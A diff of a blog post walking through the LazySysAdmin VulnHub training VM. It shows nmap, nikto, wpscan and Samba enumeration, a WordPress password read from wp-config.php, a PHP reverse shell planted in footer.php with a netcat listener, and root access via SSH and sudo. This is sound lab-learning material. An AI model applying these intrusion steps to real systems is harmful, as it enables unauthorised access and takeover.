@@ -5,20 +5,24 @@ date:   2017-12-25 16:54:07 +0800
 categories: jekyll update
 ---
 
-Well. What better way to spend christmas than solving a VulbHub machine? This VM is built for beginner/intermediate difficulty level. Link to [LazySysAdmin][lazysysadmin].
+Well. What better way to spend christmas than solving a VulbHub machine? This VM is built for beginner/intermediate difficulty level. Link to [LazySysAdmin][lazysysadmin] on VulnHub.
 
 I spent about two days on this, even though it could be done within three hours. So here is my writeup.
 
-Of course, assuming download and import is done, lets examine this machine. I am using Kali Linux, but Ubuntu will be fine in my opinion. (Install whta you need right?)
+Of course, assuming download and import is done, lets examine this machine. I am using Kali Linux, but Ubuntu will be fine in my opinion. (Install what you need right?)
 
-Since this is a VM challenge, my first instint was to do a scanning.
+## Scanning
+
+Since this is a VM challenge, my first instinct was to do scanning.
 
 Ping Scan:
 nmap -sn [network address]
+![pingscan]
 
 Once IP was found, lets do a port scan:
 nmap [target ip]
-```
+![normalscan]
+```sh
 Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-25 04:37 EST
 Nmap scan report for 192.168.56.101
 Host is up (0.00042s latency).
@@ -33,9 +37,10 @@ PORT     STATE SERVICE
 MAC Address: 08:00:27:6F:9E:3B (Oracle VirtualBox virtual NIC)
 ```
 
-Interesting... Lets have comprehensive scan for more information:
+\
+Interesting... Lets have a comprehensive scan for more information:
 nmap -A [target ip]
-```
+```sh
 Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-25 04:37 EST
 Nmap scan report for 192.168.56.101
 Host is up (0.00037s latency).
@@ -102,10 +107,14 @@ HOP RTT     ADDRESS
 1   0.37 ms 192.168.56.101
 ```
 
+## Enumeration
 
 Knowing that Port 80 is open, without opening the web browser yet, lets use `nikto`.
-nikto -host http://192.168.56.101
-```
+
+
+`nikto -host http://192.168.56.101`
+
+```sh
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.56.101
@@ -149,16 +158,19 @@ nikto -host http://192.168.56.101
 
 `nikto` presented many useful information, but what caught my attention was `robots.txt` and `/wordpress`.
 So, was there a wordpress installation? Upon viewing http://192.168.56.101/wordpress, a wordpress page was presented. 
-[insert picture]
 
-If the defaults weren't changed, http://192.168.56.101/wordpress/wp-login will take me to the login page. 
-[insert picture]
+![wphome]
 
-With the knowledge of the website having a default path for the login page, the next step is to enumerate users.
+If the defaults weren't changed, http://192.168.56.101/wordpress/wp-login will take me to the login page, and yes it is the login page. 
+
+With the knowledge of the website having a default path for the login page, the next step is to enumerate users on wordpress.
 Using `wpscan`, we will be able to perform enumeration on wordpress apps.
+
 `wpscan --url http://192.168.56.101/wordpress/ --enumerate u`
+
 With the following output:
-```
+```sh
+--output trimmed--
 [+] Enumerating usernames ...
 [+] Identified the following 1 user/s:
     +----+-------+---------+
@@ -169,29 +181,38 @@ With the following output:
 [!] Default first WordPress username 'admin' is still used
 ```
 
-NEVER keep the default admin. =)
-So of course, the first thing to try for login is "admin , admin". Well of course it didn't work. So I went on to try the brute force attack instead. Well... Don't bother trying if you are thinking about it. =)
+Lesson: NEVER keep the default admin. =)
 
-We had to look somewhere else.. The system isn't just about the web application. It is just one of the vectors of entry. Looking back at the port scan, one particular port number stood out: `445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)` 
-Yeap, `samba` was available. But in what way was it vulerable? The first thing I tried was using `metasploit framework` to take advantage of known CVE, but that didn't work. So it was yet another brick wall. After slacking off for about an hour, the word *enumeration* came to my head. I went ahead googling *samba enumeration for metasploit* (well I was kinda lazy to do it the non msfconsole way). This link helped me [SAMBA ENUMERATION][smbenum].
+## Gaining Access
+
+So of course, the first thing to try for login is "username: admin ,password: admin". Well of course it didn't work. So I went on to try brute force attack instead. Well... Don't bother trying if you are thinking about it. =)
+
+I had to look somewhere else.. The system isn't just about the web application. It is just one of the vectors of entry. Looking back at the port scan, one particular port number stood out: `445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)`. Yeap, `samba` was available. But in what way was it vulerable? The first thing I tried was using ***metasploit framework*** to take advantage of known CVE, but that didn't work. So it was yet another brick wall. After slacking off for about an hour, the word *enumeration* came to my head. I went ahead googling ***samba enumeration for metasploit*** (well I was kinda lazy to do it the non msfconsole way). This link helped me: [SAMBA ENUMERATION][smbenum].
 
 After running the enumeration, I was given the following output.
-```
+```sh
+--output trimmed--
 [+] 192.168.56.101:139    - print$ - (DS) Printer Drivers
 [+] 192.168.56.101:139    - share$ - (DS) Sumshare
 [+] 192.168.56.101:139    - IPC$ - (I) IPC Service (Web server)
 ```
 
-Lets try \\192.168.56.101\share$
-Which gives us the following files!
-[insert samba share photo]
+Lets try `\\192.168.56.101\share$` using windows explorer..
 
-And it is the root directory of the web!
-Since the wordpress was installed at http://192.168.56/101/wordpress/, the folder `wordpress` would be the first place to look at. The very first thing to look for in a wordpress installation is always `wp-config.php`. Upon opening `wp-config.php`, we will be able to locate the password for the user `admin`. Which turns out to be, `TogieMYSQL12345^^`.
+Which gave me the following files!
 
-With the credentials, I am able to login via the http://192.168.56.101/wordpress/wp-admin page. All that was left for gaining access was to insert a simple php reverse shell. This can be done by making some edits to the `footer.php`  file, which is located under "Appearance --> Editor". Since I am using Kali Linux, a template of the php reverse shell can be found at `/usr/share/webshells/php/php-reverse-shell.php`. After inserting the reverse shell code and saving the changes, I need to set up a listener. A simple netcat listener will do. 
+![smbdir]
 
-For my php reverse shell codes, I configured the port to 4444. At my Kali Machine, I set up the listener with the following command: `nc -nlvp 4444`. Once the listener is running, I proceed to refresh the the wordpress home page. The page will 'hang', but looking back at my terminal where my netcat was running on, I have successfully gained shell access. *PART ONE DONE!*
+Apparently, this is the root directory of the web server!
+
+Since the wordpress was installed at http://192.168.56/101/wordpress/, the folder `wordpress` would be the first place to look at. The very first thing to look for in a wordpress installation is always `wp-config.php`. Upon opening `wp-config.php`, I was able able to locate the password for the user `admin`. Which turns out to be, `TogieMYSQL12345^^`.
+
+With the credentials, I am able to login via the http://192.168.56.101/wordpress/wp-admin page. All that was left for gaining access was to insert a simple php reverse shell. This can be done by making some edits to the `footer.php`  file, which is located under *"Appearance --> Editor"*. Since I am using Kali Linux, a template of the php reverse shell can be found at `/usr/share/webshells/php/php-reverse-shell.php`. After inserting the reverse shell code and saving the changes, I need to set up a listener. A simple netcat listener will do. 
+
+For my php reverse shell codes, I configured the port to 4444. At my Kali Machine, I set up the listener with the following command: `nc -nlvp 4444`. Once the listener is running, I proceed to refresh the the wordpress home page. The page will 'hang', but looking back at my terminal where my netcat was running on, I have successfully gained shell access. 
+
+
+## Priviledge Escalation
 
 So since I have gained shell access, it was time to do priviledge escalation. Dirty c0w was last resort, so I went on checking if `nmap` was installed, because `nmap` has an interactive mode where commands can be used as root (No luck eventually). I also went on checking `/etc/passwd` to check out which other users exist on the system. The same can be done when I did `ls /home`. A particular user `togie` was on the system.
 
@@ -199,7 +220,7 @@ Looking back at the \\192.168.56.101\share$, there was an interesting text file 
 
 Does that mean the password is "12345"?
 Well SSH was availble and I tried.
-```
+```sh
 Using username "togie".
 ##################################################################################################
 #                                          Welcome to Web_TR1                                    #
@@ -234,7 +255,7 @@ So I tried `sudo -i`, and proceeded to enter 'togie' password.
 Well this appears to be the most "straight forward" escalation, as it was intended. Nothing sophisticated was needed. Last but not least, the following commands to check for user, current working directory and list files. `whoami;pwd;ls -la`
 
 OUTPUT:
-```
+```sh
 root
 /root
 total 28
@@ -276,3 +297,7 @@ And that's it! Successfully found the treasure! (which is proof.txt)
 
 [lazysysadmin]: https://www.vulnhub.com/entry/lazysysadmin-1,205/
 [smbenum]: https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_enumshares
+[normalscan]: https://i.imgur.com/ma90k0e.png
+[pingscan]: https://i.imgur.com/l9VoGJK.png
+[smbdir]: https://i.imgur.com/Wd06UeM.png
+[wphome]: https://i.imgur.com/nzT6JBN.png
